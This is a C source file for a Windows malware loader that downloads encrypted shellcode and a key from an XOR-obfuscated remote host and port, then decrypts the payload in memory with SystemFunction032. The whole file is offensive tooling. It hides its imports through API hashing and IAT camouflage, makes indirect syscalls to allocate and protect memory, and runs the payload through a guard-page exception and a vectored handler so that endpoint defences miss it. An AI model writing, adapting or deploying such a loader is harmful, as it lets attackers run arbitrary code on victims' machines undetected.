#include "common.h"

SIZE_T shellcode_len = 0;
PVOID BaseAddress = NULL;

LONG NTAPI VectoredHandler(struct _EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
        DWORD oldProtect;
        sysNtProtectVirtualMemory(NtCurrentProcess(), &ExceptionInfo->ExceptionRecord->ExceptionAddress, &shellcode_len, PAGE_EXECUTE_READ, &oldProtect);
        (*(void(*)())((LPTHREAD_START_ROUTINE)BaseAddress))();
        RemoveVectoredExceptionHandler((PVOID)ExceptionInfo->ContextRecord->Rax);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

    
int main(){  
    LPVOID addr = NULL;
    BYTE high = NULL;
    BYTE low = NULL;
    WORD syscallNum = NULL;
    INT_PTR syscallAddr = NULL;
    DWORD OldProtect = 0;

    IatCamouflage();

    char cipher[] = "c";
    char key[] = "k";
    size_t keyLen = sizeof(xorKey);
    char sHost[] = { 0x72, 0x56, 0x5c, 0x58, 0x54, 0x44, 0x4c, 0x6a, 0x54, 0x53, 0x51, 0x5b, 0x5d, 0x0 };
    //char sHost[] = { 0x72, 0x5f, 0x40, 0x47, 0x55, 0x5c, 0x44, 0x6a, 0x54, 0x56 };
    XORNull((char*)sHost, sizeof(sHost), (char*)xorKey, keyLen);
    char host[16];
    StringCopyA(host, sHost);
    XORNull((char*)sHost, sizeof(sHost), (char*)xorKey, keyLen);
    //const char* p = "8001";
    char sPort[] = { 0x7b, 0x5f, 0x5e, 0x47, 0x0 };
    XORNull((char*)sPort, sizeof(sPort), (char*)xorKey, keyLen);
    char port[8];
    StringCopyA(port, sPort);
    XORNull((char*)sPort, sizeof(sPort), (char*)xorKey, keyLen);

    HMODULE krnlAddr = GetModuleHandleImpl(109513359); //kernel32.dll
    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)getAPIAddr(krnlAddr, 104173313); //loadlibrary
    //PRINTA("%p\n", krnlAddr);
    //PRINTA("%p\n", pLoadLibraryA);

    HMODULE ntdllAddr = GetModuleHandleImpl(4097367);// Hash of ntdll.dll
    //PRINTA("%p\n", ntdllAddr);

    char sWs2_32_dll[] = { 0x34, 0x1c, 0x5c, 0x29, 0x56, 0x40, 0x5a, 0x20, 0x9, 0xa, 0x0 };
    XORNull((char*)sWs2_32_dll, sizeof(sWs2_32_dll), (char*)xorKey, keyLen);
    HMODULE hModule = pLoadLibraryA(sWs2_32_dll);
    XORNull((char*)sWs2_32_dll, sizeof(sWs2_32_dll), (char*)xorKey, keyLen);

    //PRINTA("[+] Getting data\n");
    DATA shellcode = getFilelessData(host, port, cipher, hModule, pLoadLibraryA);

    if (!shellcode.data) {
        PRINTA("[-] Failed in retrieving data \n");
        return -1;
    }
    //PRINTA("[+] Data retrieved %d bytes\n", shellcode.len);

    //PRINTA("\n\n[+] Retrieving additional data\n\n");
    DATA keydata = getFilelessData(host, port, key, hModule, pLoadLibraryA);

    if (!keydata.data) {
        PRINTA("[-] Failed in retrieving data \n");
        return -1;
    }

    //PRINTA("[+] Retrieved %d bytes\n\n", keydata.len);

    addr = getAPIAddr(ntdllAddr, 18887768681269);	// Hash of ZwAllocateVirtualMemory
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);

    SIZE_T dwSize = shellcode.len;
    NTSTATUS status1 = sysZwAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status1)) {
        PRINTA("[-] Failed in 1 \n");
        return -1;
    }
  
    // Macro for moving data to memory
    MOVE_MEMORY(BaseAddress, shellcode.data, shellcode.len);
    SecureZeroMemory(shellcode.data, shellcode.len);
    //decrypting the shellcode
    char advapi32[] = { 0x22, 0xb, 0x18, 0x17, 0x15, 0x1b, 0x47, 0x76, 0x4b, 0x2, 0xd, 0x19, 0x0 };
    XORNull((char*)advapi32, sizeof(advapi32), (char*)xorKey, keyLen);
    HMODULE advapi32Addr = pLoadLibraryA(advapi32);
    XORNull((char*)advapi32, sizeof(advapi32), (char*)xorKey, keyLen);
    Crypt Mem = { 0 };
    Crypt Key = { 0 };
    Mem.Buffer = BaseAddress; //encrypted shellcode in mem.buffer
    Mem.Length = Mem.MaximumLength = shellcode_len =  shellcode.len;
    Key.Buffer = keydata.data;
    Key.Length = Key.MaximumLength = keydata.len;
 
    char sysFunc032[] = { 0x1a, 0xa, 0x37, 0x1d, 0x4, 0x1, 0x29, 0x12, 0x23, 0x6, 0x7, 0x1a, 0xe, 0x9, 0x55, 0x64, 0x7b, 0x0 };
    XORNull((char*)sysFunc032, sizeof(sysFunc032), (char*)xorKey2, sizeof(xorKey2));
    SystemFunction032_t pSystemFunction032 = (SystemFunction032_t)hlpGetProcAddress(advapi32Addr, sysFunc032, pLoadLibraryA);
    XORNull((char*)sysFunc032, sizeof(sysFunc032), (char*)xorKey2, sizeof(xorKey2));
    pSystemFunction032(&Mem, &Key); //shellcode decrypted 


    DWORD oldProtect;
    addr = getAPIAddr(ntdllAddr, 6180333595348);
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NtProtectStatus1 = sysNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ | PAGE_GUARD, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        PRINTA("[-] Failed in 2 \n");
        return -2;
    }
 

    AddVectoredExceptionHandler(1, VectoredHandler);
    
    // Trigger exception through guarded access
    volatile char trigger = *(char*)Mem.Buffer;

    return 0;

}

